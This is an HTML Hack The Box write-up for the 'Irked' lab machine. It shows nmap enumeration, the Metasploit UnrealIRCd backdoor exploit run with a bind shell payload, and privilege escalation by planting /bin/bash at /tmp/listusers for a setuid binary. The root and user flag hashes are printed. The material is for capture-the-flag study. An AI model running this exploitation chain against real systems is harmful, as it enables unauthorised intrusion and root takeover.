@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Irked HTB Write-up</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        <link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        <script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>
+    </head>
+    <body class="vscode-light">
+        <h1 id="irked-htb-write-up">Irked HTB Write-up</h1>
+<p>Machine IP - 10.10.10.117</p>
+<h3 id="initial-phase">Initial Phase</h3>
+<p>Starting with an nmap scan, we get the following result -</p>
+<pre><code><code><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 18:16 +04
+Nmap scan report for 10.10.10.117
+Host is up (0.25s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+6697/tcp  open  irc     UnrealIRCd
+60500/tcp open  status  1 (RPC #100024)
+65534/tcp open  irc     UnrealIRCd
+Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.48 seconds
+</div></code></code></pre>
+<p>We can check the IRC service. It can be searched for service enumeration, which gives us the hint that it is <code>Unreal IRCd</code>. This can be searched for exploits on metasploit as follows -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/irked# nmap -sV -p 6697 10.10.10.117
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 22:31 +04
+Nmap scan report for 10.10.10.117
+Host is up (0.20s latency).
+
+PORT     STATE SERVICE VERSION
+6697/tcp open  irc     UnrealIRCd
+Service Info: Host: irked.htb
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
+</div></code></code></pre>
+<h3 id="moving-forward">Moving forward</h3>
+<p>From here, we can use metasploit for the exploit as follows -</p>
+<pre><code><code><div>root@kali:~/Desktop/Hack The Box/irked# msfconsole -q
+msf5 &gt; search unreal ircd
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date  Rank       Check  Description
+   ----                                        ---------------  ----       -----  -----------
+   exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 &quot;secure&quot; Overflow (Linux)
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+   exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 &quot;secure&quot; Overflow (Win32)
+
+###### trying the excellent one
+
+msf5 &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; show payloads
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Check  Description
+   ----                                ---------------  ----    -----  -----------
+   cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/bind_perl
+payload =&gt; cmd/unix/bind_perl
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run
+
+[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
+    :irked.htb NOTICE AUTH :*** Looking up your hostname...
+[*] 10.10.10.117:6697 - Sending backdoor command...
+[*] Started bind TCP handler against 10.10.10.117:4444
+[*] Command shell session 1 opened (10.10.12.66:41567 -&gt; 10.10.10.117:4444) at 2019-03-17 22:03:24 +0400
+
+id
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'
+ircd@irked:~/Unreal3.2$ whoami
+whoami
+ircd
+</div></code></code></pre>
+<p>This gives us the reverse shell from the vulnerable irc chat. Now to do a privilege escalation, we can do a search for the setuid binaries available to the ircd user. <code>sudo -l</code> seems to be a good starting point, but unfortunately returns nothing, in fact sudo isn't executable by the user. So, <code>find</code> command can be used instead as follows -</p>
+<pre><code><code><div>ircd@irked:~/Unreal3.2$ sudo -l
+sudo -l
+bash: sudo: command not found
+ircd@irked:~/Unreal3.2$ find / -perm 4755 2&gt;/dev/null
+find / -perm 4755 2&gt;/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+</div></code></code></pre>
+<p>The viewuser command seems to be the only odd one out i.e., all others seem to be a command that is generally present in a unix system. Therefore, we try running the command -</p>
+<pre><code><code><div>ircd@irked:~/Unreal3.2$ viewuser
+viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-03-25 01:42 (:0)
+sh: 1: /tmp/listusers: not found
+</div></code></code></pre>
+<p>The last line above is an error of bash where it is not able to find a binary <code>/tmp/listusers</code> to execute. Since the command <code>viewuser</code> is a setuid, maybe if it executes /bin/bash it can give a root shell. Therefore, we can try to create a file at the desired location, which is definitely in permissible bounds as tmp is writeable by all users.</p>
+<pre><code><code><div>ircd@irked:~/Unreal3.2$ echo &quot;/bin/bash&quot; &gt; /tmp/listusers
+echo &quot;/bin/bash&quot; &gt; /tmp/listusers
+ircd@irked:~/Unreal3.2$ chmod 777 /tmp/listusers
+chmod 777 /tmp/listusers
+ircd@irked:~/Unreal3.2$ viewuser
+viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-03-25 01:42 (:0)
+root@irked:~/Unreal3.2# cd ..
+cd ..
+root@irked:~# ls
+ls
+Unreal3.2
+root@irked:~# cd ..
+cd ..
+root@irked:/home# ls
+ls
+djmardov  ircd
+root@irked:/home# cd djmardov
+cd djmardov
+root@irked:/home/djmardov# ls
+ls
+Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
+root@irked:/home/djmardov# cd Desktop
+cd Desktop
+root@irked:/home/djmardov/Desktop# ls
+ls
+root@irked:/home/djmardov/Desktop# cd ../..
+cd ../..
+root@irked:/home# cd /root
+cd /root
+root@irked:/root# cat root.txt
+cat root.txt
+8d8e9e8be64654b6dccc3bff4522daf3
+root@irked:/root# cd /
+cd /
+root@irked:/# find / -name user.txt 2&gt;/dev/null
+find / -name user.txt 2&gt;/dev/null
+/home/djmardov/Documents/user.txt
+root@irked:/# cat /home/djmardov/Documents/user.txt
+cat /home/djmardov/Documents/user.txt
+4a66a78b12dc0e661a59d3f5c0267a8e
+</div></code></code></pre>
+<p>Thus, we get root and can read both the flags.</p>
+<hr>
+
+    </body>
+    </html>
